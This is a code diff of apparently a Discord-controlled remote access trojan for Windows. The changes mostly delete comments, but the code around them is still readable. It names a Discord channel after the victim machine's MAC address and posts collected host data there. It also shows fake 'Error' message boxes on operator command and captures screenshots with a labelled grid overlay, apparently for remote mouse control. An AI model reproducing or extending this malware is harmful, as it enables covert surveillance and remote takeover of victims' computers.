@@ -20,7 +20,7 @@ from os import listdir
 from json import loads
 from re import findall
 from urllib.request import Request, urlopen
-from PIL import Image, ImageDraw, ImageFont #mouse grid image
+from PIL import Image, ImageDraw, ImageFont
 from comtypes import CLSCTX_ALL
 from ctypes import cast, POINTER
 
@@ -259,9 +259,7 @@ async def on_ready():
     guild = client.get_guild(int(guild_id))
     channel = await find_channel_by_name(guild, mac_address)
     if channel:
-        #grabembed="hello world"
         await channel.send(embed=grabembed)
-        #await channel.send("hello world")
     else:
         channel = await guild.create_text_channel(mac_address)
         e = await channel.send(embed=grabembed)
@@ -569,7 +567,7 @@ async def on_message(message):
                 MB_HELP = 0x4000
                 ICON_STOP = 0x10
                 def mess():
-                    ctypes.windll.user32.MessageBoxW(0, content, "Error", MB_HELP | MB_YESNO | ICON_STOP) #Show message box
+                    ctypes.windll.user32.MessageBoxW(0, content, "Error", MB_HELP | MB_YESNO | ICON_STOP)
                 import threading
                 messa = threading.Thread(target=mess)
                 messa._running = True
@@ -580,7 +578,7 @@ async def on_message(message):
                 import time
                 time.sleep(1)
                 hwnd = win32gui.FindWindow(None, "Error") 
-                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE) #Put message to foreground
+                win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                 win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                 win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                 win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
@@ -608,24 +606,23 @@ async def on_message(message):
 
                 screenshot = pyautogui.screenshot()
                 overlay = Image.new('RGBA', screenshot.size, (0, 0, 0, 0))
-                grid_color = (255, 0, 0, 255)  # Grid color and transparency
+                grid_color = (255, 0, 0, 255)  
                 
-                # Determine the smaller dimension of the grid
                 grid_dimension = min(screenshot.width // grid_size, screenshot.height // grid_size)
                 labels = string.ascii_uppercase[:grid_dimension] if grid_dimension <= 26 else string.ascii_uppercase * (grid_dimension // 26) + string.ascii_uppercase[:grid_dimension % 26]
                 for x in range(0, screenshot.width, grid_size):
                     for y in range(0, screenshot.height, grid_size):
                         overlay.putpixel((x, y), grid_color)
-                        label_x = labels[x // grid_size % grid_dimension]  # Use modulo operator to wrap around labels
+                        label_x = labels[x // grid_size % grid_dimension]
                         label_y = y // grid_size + 1
                         label = f"{label_x}{label_y}"
                         draw = ImageDraw.Draw(overlay)
                         
-                        # Centering the text
+                  
                         label_width, label_height = draw.textsize(label)
                         label_position = ((x + grid_size // 2) - label_width // 2, (y + grid_size // 2) - label_height // 2)
                         
-                        # Drawing the text with white fill and black outline
+                       
                         font = ImageFont.truetype("arial.ttf", 20)
                         draw.text(label_position, label, fill=(255, 255, 255), font=font, outline=(0, 0, 0))
                 
